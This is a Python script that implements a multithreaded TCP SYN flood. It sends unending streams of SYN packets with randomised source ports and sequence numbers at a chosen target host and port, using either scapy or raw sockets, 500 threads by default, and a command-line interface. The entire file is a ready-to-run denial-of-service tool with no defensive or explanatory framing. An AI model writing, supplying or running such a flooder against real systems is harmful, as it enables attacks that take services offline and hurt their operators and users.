import argparse
import threading
import random
import socket
from scapy.all import IP, TCP, send

def syn_flood_scapy(target, port):
    while True:
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        packet = IP(dst=target) / TCP(sport=sport, dport=port, flags='S', seq=seq)
        try:
            send(packet, verbose=0)
        except:
            pass

def syn_flood_socket(target, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    while True:
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        ip_header = IP(dst=target)
        tcp_header = TCP(sport=sport, dport=port, flags='S', seq=seq)
        packet = bytes(ip_header / tcp_header)
        
        try:
            s.sendto(packet, (target, 0))
        except:
            pass

def worker(target, port, method):
    if method == 'scapy':
        syn_flood_scapy(target, port)
    elif method == 'socket':
        syn_flood_socket(target, port)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--threads", type=int, default=500)
    parser.add_argument("--method", choices=['scapy', 'socket'], default='scapy')
    
    args = parser.parse_args()

    for _ in range(args.threads):
        thread = threading.Thread(target=worker, args=(args.target, args.port, args.method))
        thread.daemon = True
        thread.start()

    while True:
        pass

if __name__ == "__main__":
    main()
